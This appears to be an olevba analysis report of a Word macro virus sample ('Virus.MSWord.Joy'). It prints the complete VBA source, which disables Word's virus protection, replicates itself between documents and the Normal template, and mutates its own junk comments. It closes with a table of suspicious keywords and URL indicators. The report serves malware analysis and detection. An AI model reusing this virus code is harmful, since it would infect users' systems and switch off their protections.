olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Joy-daff7deec3b4b579cd747dccb7d8431903cbefdf
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Joy-daff7deec3b4b579cd747dccb7d8431903cbefdf - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Sub AutoClose()
'.#7)87))#<DG4.#7))8G4<DG4.#<DG4.7))#<DG4.#7))8G4<DG4.#<DG4.
Dim rsx, rox, xix As Integer: Dim cix, xic, eox, xoe, oxe, cii, rxe, rex, exr, nix, ixn, nxi, lnr, nrl, rnl As String: Randomize
'- <(5<(&(;AL3- <((5L3;AL3-(;AL3-<(&(;AL3- <((5L3;AL3-(;AL3-
On Error GoTo 85
'-"7(77((#;CG3-"7((7G3;CG3-#;CG3-7((#;CG3-"7((7G3;CG3-#;CG3-
Options.VirusProtection = False
'-"7(77((#;CG3-"7((7G3;CG3-#;CG3-7((#;CG3-"7((7G3;CG3-#;CG3-
Options.SaveNormalPrompt = False
'."9)79)(%<CI4."9))7I4<CI4.%<CI4.9)(%<CI4."9))7I4<CI4.%<CI4.
Options.ConfirmConversions = False
'.$8)98)*$<EH4.$8))9H4<EH4.$<EH4.8)*$<EH4.$8))9H4<EH4.$<EH4.
rt = ActiveDocument.VBProject.VBComponents.Item(1).codemodule.countoflines
'5#90890)%CDI;5#9008I;CDI;5%CDI;590)%CDI;5#9008I;CDI;5%CDI;5
dt = NormalTemplate.VBProject.VBComponents.Item(1).codemodule.countoflines
'0$;+9;+*'>EK60$;++9K6>EK60'>EK60;+*'>EK60$;++9K6>EK60'>EK60
If dt > 0 And rt > 0 Then GoTo 85
'- 7(57(&#;AG3- 7((5G3;AG3-#;AG3-7(&#;AG3- 7((5G3;AG3-#;AG3-
If dt = 0 Then
'0#;+8;+)'>DK60#;++8K6>DK60'>DK60;+)'>DK60#;++8K6>DK60'>DK60
    Set Joy = NormalTemplate.VBProject.VBComponents
'3"9.79.(%ACI93"9..7I9ACI93%ACI939.(%ACI93"9..7I9ACI93%ACI93
    Set hst = ActiveDocument.VBProject.VBComponents
'- 7(57(&#;AG3- 7((5G3;AG3-#;AG3-7(&#;AG3- 7((5G3;AG3-#;AG3-
    lx = Int(Rnd(1) * 100) + 1
'."8)78)($<CH4."8))7H4<CH4.$<CH4.8)($<CH4."8))7H4<CH4.$<CH4.
    If lx = 99 Then ActiveWindow.WindowState = wdWindowStateMinimize: ActiveDocument.FollowHyperlink Address:="http://www.ultra.com", NewWindow:=False, AddHistory:=False, ExtraInfo:=Chr(74) + Chr(111) + Chr(121)
'3!8.68.'$ABH93!8..6H9ABH93$ABH938.'$ABH93!8..6H9ABH93$ABH93
    lr = Int(Rnd(1) * 75) + 1
'.!7)67)'#<BG4.!7))6G4<BG4.#<BG4.7)'#<BG4.!7))6G4<BG4.#<BG4.
    If lr = 74 Then ActiveWindow.WindowState = wdWindowStateMinimize: ActiveDocument.FollowHyperlink Address:="http://www.joy.com", NewWindow:=False, AddHistory:=False, ExtraInfo:=Chr(74) + Chr(111) + Chr(121)
'0#?+8?+)+>DO60#?++8O6>DO60+>DO60?+)+>DO60#?++8O6>DO60+>DO60
    ls = Int(Rnd(1) * 50) + 1
'5(80=80.$CIH;5(800=H;CIH;5$CIH;580.$CIH;5(800=H;CIH;5$CIH;5
    If ls = 49 Then MsgBox Chr(32) + Chr(32) + Chr(32) + Chr(32) + Chr(32) + Chr(32) + Chr(86) + Chr(105) + Chr(82) + Chr(117) + Chr(83) + Chr(32) + Chr(83) + Chr(65) + Chr(89) + Chr(83) + Chr(32) + Chr(72) + Chr(73)
'2$9-99-*%@EI82$9--9I8@EI82%@EI829-*%@EI82$9--9I8@EI82%@EI82
    lt = Int(Rnd(1) * 25) + 1
'.$9)99)*%<EI4.$9))9I4<EI4.%<EI4.9)*%<EI4.$9))9I4<EI4.%<EI4.
    If lt = 24 Then MsgBox Chr(32) + Chr(32) + Chr(67) + Chr(76) + Chr(65) + Chr(83) + Chr(83) + Chr(32) + Chr(85) + Chr(76) + Chr(84) + Chr(82) + Chr(65) + Chr(32) + Chr(74) + Chr(111) + Chr(121), vbCritical
'."8)78)($<CH4."8))7H4<CH4.$<CH4.8)($<CH4."8))7H4<CH4.$<CH4.
    hst.Item(1).Name = Joy.Item(1).Name
'."8)78)($<CH4."8))7H4<CH4.$<CH4.8)($<CH4."8))7H4<CH4.$<CH4.
    hst.Item(1).Export Application.StartupPath & Chr(74) + Chr(111) + Chr(121)
'3#8.88.)$ADH93#8..8H9ADH93$ADH938.)$ADH93#8..8H9ADH93$ADH93
End If
'1!7,67,'#?BG71!7,,6G7?BG71#?BG717,'#?BG71!7,,6G7?BG71#?BG71
If rt = 0 Then Set Joy = ActiveDocument.VBProject.VBComponents
'-!8(68('$;BH3-!8((6H3;BH3-$;BH3-8('$;BH3-!8((6H3;BH3-$;BH3-
Joy.Item(1).codemodule.AddFromFile Application.StartupPath & Chr(74) + Chr(111) + Chr(121)
'.!7)67)'#<BG4.!7))6G4<BG4.#<BG4.7)'#<BG4.!7))6G4<BG4.#<BG4.
With Joy.Item(1).codemodule
'-!8(68('$;BH3-!8((6H3;BH3-$;BH3-8('$;BH3-!8((6H3;BH3-$;BH3-
    For j = 1 To 4
'-";(7;((';CK3-";((7K3;CK3-';CK3-;((';CK3-";((7K3;CK3-';CK3-
    .deletelines 1
'-"7(77((#;CG3-"7((7G3;CG3-#;CG3-7((#;CG3-"7((7G3;CG3-#;CG3-
    Next j
'.":)7:)(&<CJ4.":))7J4<CJ4.&<CJ4.:)(&<CJ4.":))7J4<CJ4.&<CJ4.
    End With
'0$9+99+*%>EI60$9++9I6>EI60%>EI609+*%>EI60$9++9I6>EI60%>EI60
If dt = 0 Then Joy.Item(1).codemodule.replaceline 1, "Sub AutoClose()"
'.$8)98)*$<EH4.$8))9H4<EH4.$<EH4.8)*$<EH4.$8))9H4<EH4.$<EH4.
If dt = 0 Then Joy.Item(1).codemodule.replaceline 91, "Sub ToolsMarco()"
'0!8+68+'$>BH60!8++6H6>BH60$>BH608+'$>BH60!8++6H6>BH60$>BH60
If dt = 0 And rt = 0 Then ActiveDocument.SaveAs FileName:=ActiveDocument.FullName
'. :)5:)&&<AJ4. :))5J4<AJ4.&<AJ4.:)&&<AJ4. :))5J4<AJ4.&<AJ4.
With Joy.Item(1).codemodule
'-"9(79((%;CI3-"9((7I3;CI3-%;CI3-9((%;CI3-"9((7I3;CI3-%;CI3-
    For j = 2 To Joy.Item(1).codemodule.countoflines Step 2
'-#8(88()$;DH3-#8((8H3;DH3-$;DH3-8()$;DH3-#8((8H3;DH3-$;DH3-
    rsx = Int(Rnd(11) * 2998) + 24: rox = Int(Rnd(15) * 5863) + 33: xix = Int(Rnd(44) * 3544) + 55
'5$90990*%CEI;5$9009I;CEI;5%CEI;590*%CEI;5$9009I;CEI;5%CEI;5
    cii = Asc(rsx): eox = Chr$(cii + 2): xoe = Chr$(cii - 9): oxe = Chr$(cii + 10): lnr = Chr$(cii - 4)
'0!7+67+'#>BG60!7++6G6>BG60#>BG607+'#>BG60!7++6G6>BG60#>BG60
    cix = Asc(rox): rxe = Chr$(cix + 4): rex = Chr$(cix - 11): exr = Chr$(cix + 16): nrl = Chr$(cix - 17)
'- 9(59(&%;AI3- 9((5I3;AI3-%;AI3-9(&%;AI3- 9((5I3;AI3-%;AI3-
    xic = Asc(xix): nix = Chr$(xic + 6): ixn = Chr$(xic - 14): nxi = Chr$(xic + 22): rnl = Chr$(xic - 33)
'0#7+87+)#>DG60#7++8G6>DG60#>DG607+)#>DG60#7++8G6>DG60#>DG60
    .replaceline j, "'" & lnr & nrl & rnl & nix & xoe & rxe & nix & xoe & rex & ixn & oxe & exr & nxi & eox & lnr & nrl & rnl & nix & xoe & xoe & rxe & nxi & eox & oxe & exr & nxi & eox & lnr & ixn & oxe & exr & nxi & eox & lnr & nix & xoe & rex & ixn & oxe & exr & nxi & eox & lnr & nrl & rnl & nix & xoe & xoe & rxe & nxi & eox & oxe & exr & nxi & eox & lnr & ixn & oxe & exr & nxi & eox & lnr
'. 8)58)&$<AH4. 8))5H4<AH4.$<AH4.8)&$<AH4. 8))5H4<AH4.$<AH4.
Next j
'-"8(78(($;CH3-"8((7H3;CH3-$;CH3-8(($;CH3-"8((7H3;CH3-$;CH3-
End With
'- 7(57(&#;AG3- 7((5G3;AG3-#;AG3-7(&#;AG3- 7((5G3;AG3-#;AG3-
85:
'. 7)57)&#<AG4. 7))5G4<AG4.#<AG4.7)&#<AG4. 7))5G4<AG4.#<AG4.
If dt <> 0 And rt = 0 Then ActiveDocument.SaveAs FileName:=ActiveDocument.FullName
'. =)5=)&)<AM4. =))5M4<AM4.)<AM4.=)&)<AM4. =))5M4<AM4.)<AM4.
End Sub
'-!9(69('%;BI3-!9((6I3;BI3-%;BI3-9('%;BI3-!9((6I3;BI3-%;BI3-
Sub ToolsMarco()
'3!7.67.'#ABG93!7..6G9ABG93#ABG937.'#ABG93!7..6G9ABG93#ABG93
End Sub
'/"7*77*(#=CG5/"7**7G5=CG5/#=CG5/7*(#=CG5/"7**7G5=CG5/#=CG5/

'."7)77)(#<CG4."7))7G4<CG4.#<CG4.7)(#<CG4."7))7G4<CG4.#<CG4.

'.$7)97)*#<EG4.$7))9G4<EG4.#<EG4.7)*#<EG4.$7))9G4<EG4.#<EG4.
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoClose           |Runs when the Word document is closed        |
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|codemodule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|IOC       |http://www.ultra.com|URL                                          |
|IOC       |http://www.joy.com  |URL                                          |
+----------+--------------------+---------------------------------------------+

